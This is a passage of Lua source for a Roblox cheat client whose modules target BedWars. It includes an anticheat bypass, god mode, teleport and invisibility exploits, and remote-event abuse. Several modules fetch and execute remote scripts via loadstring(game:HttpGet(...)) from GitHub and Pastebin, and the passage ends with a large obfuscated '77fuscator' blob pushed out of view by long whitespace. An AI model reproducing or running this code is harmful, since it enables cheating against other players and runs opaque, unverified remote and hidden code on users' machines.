		local HeartBeatConnect2 = tick()
		local Value = HeartBeatConnect2 - (HeartBeatConnect2 - HeartBeatConnect <= 999 and 0 or 999)
		HeartBeatConnect = math.max(HeartBeatConnect,Value)
	end
	Disabler = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AnticheatBypassV2",
	    HoverText = "better AnticheatBypass reel",
        Function = function(callback)
            if callback then
				SendNotify = true
				NoDisable = true
				task.spawn(function()
					repeat
						task.wait()
						RenderSteppedConnection = game:GetService("RunService").RenderStepped:Connect(getRenderStepped)
						HeartbeatConnection = game:GetService("RunService").Heartbeat:Connect(getHeartBeat)
						local item = getItemNear("scythe")
						repeat task.wait() until item
						if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then
							if DisablerMode.Value == "MoveDirection" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection
									})
								end
							elseif DisablerMode.Value == "LookVector" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector
									})
								end
							end
							if entityLibrary.isAlive and entityLibrary.character.Head.Transparency ~= 0 then
								bedwarsStore.scythe = tick() + 1
							end
						elseif item and lplr.Character.HandInvItem.Value ~= item.tool and bedwars.CombatController then
							if SendNotify then
								if DisablerNotify.Value == "Vape" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
								elseif DisablerNotify.Value == "Print" then
									print(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Warn" then
									warn(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Combined" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
									print(DisablerTable.Messages.Context3)
									warn(DisablerTable.Messages.Context3)
								end
								SendNotify = false
							end
							if DisablerMissing.Value == "Continue" then
								task.wait(DisablerTable.Values.Duration)
								SendNotify = true
								NoDisable = true
							elseif DisablerMissing.Value == "Disable" then
								NoDisable = false
							end
							if not NoDisable then
								Disabler.ToggleButton(false)
								return
							end
						elseif not item then
							if DisablerNotify.Value == "Vape" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
							elseif DisablerNotify.Value == "Print" then
								print(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Warn" then
								warn(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Combined" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
								print(DisablerTable.Messages.Context4)
								warn(DisablerTable.Messages.Context4)
							end
							Disabler.ToggleButton(false)
							return
						end
					until not Disabler.Enabled
				end)
			else
				HeartbeatConnection:Disconnect()
				RenderSteppedConnection:Disconnect()
            end
        end,
		ExtraText = function()
			return DisablerMode.Value
		end
    })
	DisablerMode = Disabler.CreateDropdown({
		Name = "Mode",
		List = {
			"MoveDirection",
			"LookVector"
		},
		HoverText = "Disabler Mode",
		Function = function() end,
	})
	DisablerMissing = Disabler.CreateDropdown({
		Name = "Missing Scythe",
		List = {
			"Continue",
			"Disable"
		},
		HoverText = "Actions that will occur when the Scythe is missing",
		Function = function() end,
	})
	DisablerNotify = Disabler.CreateDropdown({
		Name = "Notification",
		List = {
			"Vape",
			"Print",
			"Warn",
			"Combined"
		},
		HoverText = "Notification that will be displayed",
		Function = function() end,
	})
	DisablerDuration = Disabler.CreateSlider({
		Name = "Duration",
		Min = 1,
		Max = 10,
		HoverText = "Notification's Duration",
		Function = function() end,
		Default = 5
	})
	DisablerSpeedVal = Disabler.CreateSlider({
		Name = "Speed",
		Min = 1,
		Max = 100,
		HoverText = "Direction Speed",
		Function = function() end,
		Default = 90
	})
	DisablerSpeed = Disabler.CreateToggle({
		Name = "Speed",
		Default = true,
		HoverText = "Adds speed to the direction",
		Function = function() end,
	})
	DisablerNotification = Disabler.CreateToggle({
		Name = "Notification",
		Default = true,
		HoverText = "Notifies you when certain actions happen",
		Function = function() end,
	})
end)

local Nebula = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
	["Name"] = "NebulaSky",
	["Function"] = function(callback)
		if callback then
			task.spawn(function() 

				local Vignette = true


				local Lighting = game:GetService("Lighting")
				local ColorCor = Instance.new("ColorCorrectionEffect")
				local SunRays = Instance.new("SunRaysEffect")
				local Sky = Instance.new("Sky")
				local Atm = Instance.new("Atmosphere")


				for i, v in pairs(Lighting:GetChildren()) do
					if v then
						v:Destroy()
					end
				end

				ColorCor.Parent = Lighting
				SunRays.Parent = Lighting
				Sky.Parent = Lighting
				Atm.Parent = Lighting

				if Vignette == true then
					local Gui = Instance.new("ScreenGui")
					Gui.Parent = StarterGui
					Gui.IgnoreGuiInset = true

					local ShadowFrame = Instance.new("ImageLabel")
					ShadowFrame.Parent = Gui
					ShadowFrame.AnchorPoint = Vector2.new(0,1,0)
					ShadowFrame.Position = UDim2.new(0,0,0,0)
					ShadowFrame.Size = UDim2.new(0,0,0,0)
					ShadowFrame.BackgroundTransparency = 1
					ShadowFrame.Image = ""
					ShadowFrame.ImageTransparency = 1
					ShadowFrame.ZIndex = 0
				end


				ColorCor.Brightness = 0.1
				ColorCor.Contrast = 0.5
				ColorCor.Saturation = -0.3
				ColorCor.TintColor = Color3.fromRGB(255, 235, 203)

				SunRays.Intensity = 0.075
				SunRays.Spread = 0.727

				Sky.SkyboxBk = "rbxassetid://13581437029"
				Sky.SkyboxDn = "rbxassetid://13581439832"
				Sky.SkyboxFt = "rbxassetid://13581447312"
				Sky.SkyboxLf = "rbxassetid://13581443463"
				Sky.SkyboxRt = "rbxassetid://13581452875"
				Sky.SkyboxUp = "rbxassetid://13581450222"
				Sky.SunAngularSize = 10

				Lighting.Ambient = Color3.fromRGB(2,2,2)
				Lighting.Brightness = 0.3
				Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
				Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
				Lighting.EnvironmentDiffuseScale = 0.2
				Lighting.EnvironmentSpecularScale = 0.2
				Lighting.GlobalShadows = true
				Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
				Lighting.ShadowSoftness = 0.2
				Lighting.ClockTime = 15
				Lighting.GeographicLatitude = 45
				Lighting.ExposureCompensation = 0.5

				Atm.Density = 0.364
				Atm.Offset = 0.556
				Atm.Color = Color3.fromRGB(179, 59, 249)
				Atm.Decay = Color3.fromRGB(155, 212, 255)
				Atm.Glare = 0.36
				Atm.Haze = 1.72	
                end)
			end
		end
    })

runFunction(function()
		local Reinject = {["Enabled"] = false}
		Reinject = GuiLibrary["ObjectsThatCanBeSaved"]["APEWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Reinject",
			["HoverText"] = "Reinjects Vape To Load Modules",
			   ["Function"] = function(Callback)
					Enabled = Callback
					if Enabled then
						Reinject["ToggleButton"](false)
						GuiLibrary["SelfDestruct"]()
						loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
	
	
					end
				end
		})
	end)

runFunction(function()
   Pink = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
	["Name"] = "PinkTheme",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				for i,v in pairs(lightingService:GetChildren()) do
					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
						v:Remove()
					end
				end
				local sky = Instance.new("Sky")
				sky.SkyboxBk = "rbxassetid://1546230803"
				sky.SkyboxDn = "rbxassetid://1546231143"
				sky.SkyboxFt = "rbxassetid://1546230803"
				sky.SkyboxLf = "rbxassetid://1546230803"
				sky.SkyboxRt = "rbxassetid://1546230803"
				sky.SkyboxUp = "rbxassetid://1546230451"
				sky.Parent = lightingService
				pcall(function() workspace.Clouds:Destroy() end)
				local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
				damagetab.strokeThickness = false
				damagetab.textSize = 32
				damagetab.blowUpDuration = 0
				damagetab.baseColor = Color3.fromRGB(255, 132, 178)
				damagetab.blowUpSize = 32
				damagetab.blowUpCompleteDuration = 0
				damagetab.anchoredDuration = 0
				debug.setconstant(bedwars.DamageIndicator, 83, Enum.Font.LuckiestGuy)
				debug.setconstant(bedwars.DamageIndicator, 102, "Enabled")
				debug.setconstant(bedwars.DamageIndicator, 118, 0.3)
				debug.setconstant(bedwars.DamageIndicator, 128, 0.5)
				debug.setupvalue(bedwars.DamageIndicator, 10, {
					Create = function(self, obj, ...)
						task.spawn(function()
							obj.Parent.Parent.Parent.Parent.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
							local textcompare = obj.Parent.TextColor3
							if textcompare ~= Color3.fromRGB(85, 255, 85) then
								local newtween = tweenService:Create(obj.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
									TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(0, 0, 0) or Color3.new(0, 0, 0))
								})
								task.wait(0.15)
								newtween:Play()
							end
						end)
						return tweenService:Create(obj, ...)
					end
				})
				local colorcorrection = Instance.new("ColorCorrectionEffect")
				colorcorrection.TintColor = Color3.fromRGB(255, 199, 220)
				colorcorrection.Brightness = 0.05
				colorcorrection.Parent = lightingService
				debug.setconstant(require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui.healthbar["hotbar-healthbar"]).HotbarHealthbar.render, 16, 16745650)
			end)
		end
	end
})
end)

runFunction(function()
        local FlyGui = {Enabled = false}
        FlyGui = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
            Name = "FlyLoader",
            HoverText = "Loads FlyGui credits to Red",
            Function = function(callback)
                if callback then
                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        loadstring(game:HttpGet(('https://pastebin.com/raw/h5QDPy6s'),true))()
						FlyGui.ToggleButton(false)
						warningNotification("APE", "Fly Gui Should Be Loaded Up", 5)
					else
                end
            end
		end
    })
end)

	runFunction(function()
		local InfiniteYield = {Enabled = false}
		InfiniteYield = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "InfiniteYield",
			Function = function(callback)
				if callback then
					task.spawn(function()
					loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
					InfiniteYield["ToggleButton"](false)
					warningNotification("APE", "Loaded Infinite Yield!", 5)
					end)
				end
			end,
			HoverText = "infinite yield lel"
		})
	end)

runFunction(function()
	local AnimationPlayer = {Enabled = false}
	local AnimationPlayerBox = {Value = "11335949902"}
	local AnimationPlayerSpeed = {Speed = 1}
	local playedanim
	AnimationPlayer = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "InvisibleExploit",
		HoverText = "put you underground",
		Function = function(callback)
			if callback then 
				if entityLibrary.isAlive then 
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
                        lplr.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)
                        lplr.Character.HumanoidRootPart.Size = Vector3.new(2, 3, 1.1)
						
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(0 / 10)
						table.insert(AnimationPlayer.Connections, playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end))
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end
				table.insert(AnimationPlayer.Connections, lplr.CharacterAdded:Connect(function()
					repeat task.wait() until entityLibrary.isAlive or not AnimationPlayer.Enabled
					task.wait(0.5)
					if not AnimationPlayer.Enabled then return end
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(AnimationPlayerSpeed.Value / 10)
						playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end)
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end))
			else
				if playedanim then playedanim:Stop() playedanim = nil end
			end
		end
	})
end)

	runFunction(function()
		local HostPanelExploit = {Enabled = false}
		local oldhostattribute = nil
		HostPanelExploit = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "VisualHostPanel",
			HoverText = "only visual",
			Function = function(callback)
				task.spawn(function()
					if oldhostattribute == nil then 
						oldhostattribute = (lplr:GetAttribute("Cohost") or lplr:GetAttribute("Host")) and true or false
					end
					if not callback and bedwars.ClientStoreHandler:getState().Game.customMatch and oldhostattribute then 
						return
					end
					lplr:SetAttribute("Cohost", callback)
				end)
			end
		})
	end)

runFunction(function()
    local AutoSkywars = {Enabled = false}
    AutoSkywars = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AutoSkywars",
	HoverText = "tp you to middle sometimes works (only skywars)",
        Function = function(callback)
            if callback then
                task.spawn(function()
                    if bedwarsStore.queueType:find("skywars") then
                        if bedwarsStore.matchState ~= 0 then return end
                        repeat task.wait() until bedwarsStore.matchState ~= 0
                        if (not AutoSkywars.Enabled) then return end
                        task.wait(0.1)
                        local tween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {CFrame = workspace.SpectatorPlatform.floor.CFrame - Vector3.new(0,1.5,5)})
                        tween:Play()
                        tween.Completed:Wait()
                        task.wait(0.5)
                        workspace.SpectatorPlatform.floor.CanCollide = false
                    end
                end)
            end
        end
    })
end)

function IsAlive(plr)
    plr = plr or lplr
    if not plr.Character then return false end
    if not plr.Character:FindFirstChild("Head") then return false end
    if not plr.Character:FindFirstChild("Humanoid") then return false end
    if plr.Character:FindFirstChild("Humanoid").Health < 0.11 then return false end
    return true
end

runFunction(function()
    local GodMode = {Enabled = false}
    GodMode = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "PartialGodMode",
        Function = function(callback)
            if callback then
				spawn(function()
					while task.wait() do
						if (not GodMode.Enabled) then return end
						if (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) then
							for i, v in pairs(game:GetService("Players"):GetChildren()) do
								if v.Team ~= lplr.Team and IsAlive(v) and IsAlive(lplr) then
									if v and v ~= lplr then
										local TargetDistance = lplr:DistanceFromCharacter(v.Character:FindFirstChild("HumanoidRootPart").CFrame.p)
										if TargetDistance < 25 then
											if not lplr.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity") then
												repeat task.wait() until bedwarsStore.matchState ~= 0
												if not (v.Character.HumanoidRootPart.Velocity.Y < -10*5) then
													lplr.Character.Archivable = true
			
													local Clone = lplr.Character:Clone()
													Clone.Parent = workspace
													Clone.Head:ClearAllChildren()
													gameCamera.CameraSubject = Clone:FindFirstChild("Humanoid")
				
													for i,v in pairs(Clone:GetChildren()) do
														if string.lower(v.ClassName):find("part") and v.Name ~= "HumanoidRootPart" then
															v.Transparency = 1
														end
														if v:IsA("Accessory") then
															v:FindFirstChild("Handle").Transparency = 1
														end
													end
				
													lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0,100000,0)
				
													game:GetService("RunService").RenderStepped:Connect(function()
														if Clone ~= nil and Clone:FindFirstChild("HumanoidRootPart") then
															Clone.HumanoidRootPart.Position = Vector3.new(lplr.Character.HumanoidRootPart.Position.X, Clone.HumanoidRootPart.Position.Y, lplr.Character.HumanoidRootPart.Position.Z)
														end
													end)
				
													task.wait(0.3)
													lplr.Character.HumanoidRootPart.Velocity = Vector3.new(lplr.Character.HumanoidRootPart.Velocity.X, -1, lplr.Character.HumanoidRootPart.Velocity.Z)
													lplr.Character.HumanoidRootPart.CFrame = Clone.HumanoidRootPart.CFrame
													gameCamera.CameraSubject = lplr.Character:FindFirstChild("Humanoid")
													Clone:Destroy()
													task.wait(0.15)
												end
											end
										end
									end
								end
							end
						end
					end
				end)
			end
        end
    })
end)

	runFunction(function()
		local AutoEmber = {Enabled = false}
		AutoEmber = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "4BigGuysExploit",
			HoverText = "Automatically uses the ember ability.",
			Function = function(callback)
				if callback then 
					task.spawn(function()
						repeat 
							local saber = getItem("infernal_saber")
							if killauraNearPlayer and saber then 
								bedwars.ClientHandler:Get("HellBladeRelease"):SendToServer({chargeTime = 0.5, player = lplr, weapon = saber.tool})
							end
							task.wait()
						until not AutoEmber.Enabled
					end)
				end
			end
		})
	end)
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/blacklisted.lua"))()

warningNotification("APE", "Loaded Succesfully By RayHafz!", 5)
																																																																						
do local a=[[77fuscator 0.5.0 - discord.gg/CEHsVcBcuf]];return(function(b,c,d,e,f,f,g,h,i,j,k,l,l,m,n,o,p,q,r,s,t,u,u,v,w,w,x,y,y,z,z,z,ba,ba,bb,bb,bb,bc)local bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz,ca,cb,cc,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn,co,cp,cq,cr=0 while true do if bd<=17 then if bd<=8 then if bd<=3 then if bd<=1 then if bd==0 then be,bf,bg,bh,bi,bj,bk=string.sub,table.concat,string.char,tonumber,next,(table.create or function(cs,ct)local cu,cv=0 while true do if cu<=1 then if cu<1 then cv={}else for cw=1,cs do cv[cw]=ct;end;end else if cu<3 then return cv;else break end end cu=cu+1 end end)or tostring else bl=1 end else if bd==2 then bm=function(bi)local bk,cs,ct,cu,cv,cw,cx,cy=0 while true do if bk<=5 then if bk<=2 then if bk<=0 then cs,ct=g,g else if 1==bk then cu=bj(#bi)else cv=256 end end else if bk<=3 then cw=bj(cv)else if bk<5 then for bj=0,cv-1 do cw[bj]=bg(bj)end else cx=1 end end end else if bk<=8 then if bk<=6 then cy=function()local bj,cz,da=0 while true do if bj<=2 then if bj<=0 then cz=bh(be(bi,cx,cx),36)else if bj==1 then cx=(cx+1)else da=bh(be(bi,cx,(cx+cz-1)),36)end end else if bj<=3 then cx=cx+cz else if 5~=bj then return da else break end end end bj=bj+1 end end else if bk>7 then cu[1]=cs else cs=bg(cy())end end else if bk<=9 then while(cx<#bi and#a==d)do local a=cy()if cw[a]then ct=cw[a]else ct=(cs..be(cs,1,1))end cw[cv]=(cs..be(ct,1,1))cu[(#cu+1)],cs,cv=ct,ct,cv+1 end else if bk~=11 then return bf(cu)else break end end end end bk=bk+1 end end else bn=bm(b)end end else if bd<=5 then if bd==4 then bo={}else c={m,o,q,y,k,u,j,s,x,l,w,i,nil,nil,nil,nil};end else if bd<=6 then bp=v else if bd==7 then bq=bp(bo)else br,bs=1,((-3795+(function()local a,b,c,d,q=0 while true do if a<=0 then b,c,d,q=0 else if 1<a then break else while true do if(b==1 or b<1)then if b>0 then q=(function(s,v,w)local x,y=0 while true do if x<=0 then y=0 else if x==1 then while true do if y==0 then w(s(w,v,s),w(v,w,w),w(v,((w and w)),w))else break end y=(y+1)end else break end end x=x+1 end end)(function(s,v,w)local x,y=0 while true do if x<=0 then y=0 else if x==1 then while true do if(y<2 or y==2)then if(y<=0)then if c>397 then return v end else if 2>y then c=(c+1)else d=(((d-950))%41161)end end else if y<=3 then if(((d%1618))<809)then d=(((d+329)%29735))return v else return w(s(v,(v and w),((w and w))),v(v,s,s),s(w,v,v))end else if not(5==y)then return s((s(w,v,v)and v(s,v,v)),w(s,w,v),v(s,w,v))else break end end end y=y+1 end else break end end x=x+1 end end,function(s,v,w)local x,y=0 while true do if x<=0 then y=0 else if 1==x then while true do if(y<2 or y==2)then if(y==0 or y<0)then if(c>498)then return w end else if not(y==2)then c=(c+1)else d=((d*836)%30123)end end else if y<=3 then if(d%872)>=436 then return w(w(w,w,s),w(v,s,s),v(v,w,w))else return v end else if not(4~=y)then return s else break end end end y=y+1 end else break end end x=x+1 end end,function(s,v,w)local x,y=0 while true do if x<=0 then y=0 else if 2>x then while true do if(y==2 or y<2)then if y<=0 then if c>271 then return v end else if(y==1)then c=c+1 else d=((d+913))%7592 end end else if(y<3 or y==3)then if((((d%1670)>835)or(d%1670)==835))then return w else return w(v(v,w,s),w((v and s),w,s),s(s,s,v))end else if 5~=y then return s((s(s,v,w)and v(v,s,v and w)),w(v,w,w),(w(s,s and v,v)and w(s,s,w and v)))else break end end end y=(y+1)end else break end end x=x+1 end end)else c,d=0,1 end else if b>2 then break else return d;end end b=b+1 end end end a=a+1 end end)()))end end end end else if bd<=12 then if bd<=10 then if bd==9 then bt={}else bu=function(a,b)local c,d=0 while true do if c<=1 then if 1>c then d=0 else for q=0,31 do local s=a%2 local v=b%2 if(s==0)then if not(v~=1)then b=(b-1)d=d+2^q end else a=a-1 if not(v~=0)then d=(d+(2^q))else b=(b-1)end end b=(b/2)a=a/2 end end else if c<3 then return d else break end end c=c+1 end end end else if bd<12 then bv=function(a,b)local c=0 while true do if 1>c then return((a*2^b));else break end c=c+1 end end else bw=function()local a,b,c=0 while true do if a<=1 then if a~=1 then b,c=h(bn,br,(br+2))else b,c=bu(b,bs),bu(c,bs);end else if a<=2 then br=br+2;else if 3==a then return((bv(c,8))+b);else break end end end a=a+1 end end end end else if bd<=14 then if 13<bd then bx=bt else do for a,b in o,l(bl)do bt[a]=b;end;end;end else if bd<=15 then by=function(a,b)local c=0 while true do if c==0 then return p((a/2^b));else break end c=c+1 end end else if bd==16 then bz=2^32-1 else ca=function(a,b)local c=0 while true do if 1~=c then return(((a+b)-bu(a,b))/2)else break end c=c+1 end end end end end end end else if bd<=26 then if bd<=21 then if bd<=19 then if bd~=19 then cb=bw()else cc=function(a,b)local c=0 while true do if c>0 then break else return bz-ca(bz-a,(bz-b))end c=c+1 end end end else if bd~=21 then cd=function(a,b,c)local d=0 while true do if d~=1 then if c then local c=(a/2^(b-1))%2^((c-1)-(b-1)+1)return c-(c%1)else local b=2^(b-1)return(a%(b+b)>=b)and 1 or 0 end else break end d=d+1 end end else ce=bw()end end else if bd<=23 then if 22<bd then cg=function()local a,b=0 while true do if a<=1 then if 1>a then b=bu(h(bn,br,br),cb)else br=br+1;end else if 3~=a then return b;else break end end a=a+1 end end else cf=function()local a,b,c,d,p=0 while true do if a<=1 then if 1~=a then b,c,d,p=h(bn,br,(br+3))else b,c,d,p=bu(b,cb),bu(c,cb),bu(d,cb),bu(p,cb);end else if a<=2 then br=(br+4);else if a~=4 then return((bv(p,24)+bv(d,16)+bv(c,8)))+b;else break end end end a=a+1 end end end else if bd<=24 then ch,ci,cj=nil else if 26>bd then ch=((-14488+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca=0 while true do if a<=0 then b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca=0 else if 1<a then break else while true do if b<=10 then if(b==4 or b<4)then if(b==1 or b<1)then if b>0 then d=48533 else c=526 end else if b<=2 then p=3 else if(b~=4)then q=270 else s=540 end end end else if(b<7 or b==7)then if(b<=5)then v=12318 else if 7>b then w=385 else x=137 end end else if(b<=8)then y=35083 else if not(b~=9)then be=254 else bf=340 end end end end else if b<=15 then if(b<12 or b==12)then if 11<b then bh=170 else bg=2 end else if(b<13 or b==13)then bi=19255 else if not(15==b)then bj=1 else bk=423 end end end else if(b<18 or b==18)then if(b<=16)then bs=240 else if not(b~=17)then bw=0 else by,bz=bw,bj end end else if(b<19 or b==19)then ca=(function(cc,ce)local cs,ct=0 while true do if cs<=0 then ct=0 else if cs~=2 then while true do if not(1==ct)then ce(cc(cc,cc)and cc(cc,cc),(ce(ce,(cc and cc))and ce(cc,ce)))else break end ct=ct+1 end else break end end cs=cs+1 end end)(function(cc,ce)local cs,ct=0 while true do if cs<=0 then ct=0 else if 2~=cs then while true do if(ct==2 or ct<2)then if(ct<0 or ct==0)then if(by>bs)then local bs=bw while true do bs=(bs+bj)if not(not(bs==bj))then return ce else break end end end else if 2>ct then by=((by+bj))else bz=((bz-bk)%bi)end end else if(ct<=3)then if(((bz%bf))<bh)then local bf=bw while true do bf=(bf+bj)if(((bf>bg))or not(bf~=bg))then if(bf<p)then return ce(cc(cc,(cc and ce)),ce(cc,cc))else break end else bz=((bz+be))%y end end else local y=bw while true do y=((y+bj))if(y<bg)then return ce else break end end end else if ct<5 then return cc else break end end end ct=(ct+1)end else break end end cs=cs+1 end end,function(y,be)local bf,bh=0 while true do if bf<=0 then bh=0 else if 1==bf then while true do if bh<=2 then if(bh<=0)then if((by>x))then local x=bw while true do x=(x+bj)if not(not(x==bg))then break else return y end end end else if 2~=bh then by=(by+bj)else bz=(((bz*w)%v))end end else if(bh==3 or bh<3)then if(((bz%s))>q)then local q=bw while true do q=((q+bj))if(q==bj or q<bj)then bz=((bz*c)%d)else if not(not(not(q~=p)))then break else return y(be(y,be),y(be,y))end end end else local c=bw while true do c=c+bj if(c<bg)then return y else break end end end else if(bh~=5)then return be else break end end end bh=(bh+1)end else break end end bf=bf+1 end end)else if(20==b)then return bz;else break end end end end end b=(b+1)end end end a=a+1 end end)()));else ci=(-25303+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz=0 while true do if a<=10 then if a<=4 then if a<=1 then if a~=1 then b=40425 else c=236 end else if a<=2 then d=960 else if 4>a then p=1920 else q=33223 end end end else if a<=7 then if a<=5 then s=2 else if 7~=a then v=894 else w=201 end end else if a<=8 then x=3 else if a~=10 then y=1330 else be=5906 end end end end else if a<=15 then if a<=12 then if 11<a then bg=665 else bf=617 end else if a<=13 then bh=211 else if a==14 then bi=33389 else bj=787 end end end else if a<=18 then if a<=16 then bk=1 else if 18>a then bs=0 else bw,by=bs,bk end end else if a<=19 then bz=(function(ca,cc)local ce=0 while true do if ce==0 then cc(cc(ca,ca),ca(cc,cc))else break end ce=ce+1 end end)(function(ca,cc)local ce=0 while true do if ce<=2 then if ce<=0 then if bw>bh then local bh=bs while true do bh=bh+bk if not(bh~=bk)then return cc else break end end end else if 1==ce then bw=(bw+bk)else by=((by-bj)%bi)end end else if ce<=3 then if(by%y)<bg then local y=bs while true do y=(y+bk)if(y==bk or y<bk)then by=(by*bf)%be else if not(y~=x)then break else return cc(cc(cc,cc),(ca(cc,cc)and cc(ca,cc)))end end end else local y=bs while true do y=(y+bk)if not(y~=s)then break else return cc end end end else if ce<5 then return cc else break end end end ce=ce+1 end end,function(y,be)local bf=0 while true do if bf<=2 then if bf<=0 then if(bw>w)then local w=bs while true do w=(w+bk)if not(not(w==s))then break else return be end end end else if bf==1 then bw=(bw+bk)else by=((by+v)%q)end end else if bf<=3 then if((by%p)>d)then local d=bs while true do d=(d+bk)if(d<bk or d==bk)then by=((by*c)%b)else if not(not(d==x))then break else return be(y(y,be and y),be(be,y))end end end else local b=bs while true do b=(b+bk)if b>bk then break else return y end end end else if 5~=bf then return y else break end end end bf=bf+1 end end)else if 20==a then return by;else break end end end end end a=a+1 end end)());end end end end else if bd<=31 then if bd<=28 then if 27==bd then cj=(-1671+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca,cc,ce,cs,ct,cu,cv,cw,cx,cy,cz=0 while true do if a<=15 then if a<=7 then if a<=3 then if a<=1 then if 1>a then b=409 else c=818 end else if a<3 then d=28939 else p=222 end end else if a<=5 then if 4==a then q=389 else s=38485 end else if a~=7 then v=1166 else w=583 end end end else if a<=11 then if a<=9 then if 8==a then x=9454 else y=425 end else if a>10 then bf=442 else be=4509 end end else if a<=13 then if a<13 then bg=292 else bh=3 end else if 15>a then bi=1696 else bj=848 end end end end else if a<=23 then if a<=19 then if a<=17 then if a==16 then bk=579 else bs=10108 end else if 19>a then bw=252 else by=908 end end else if 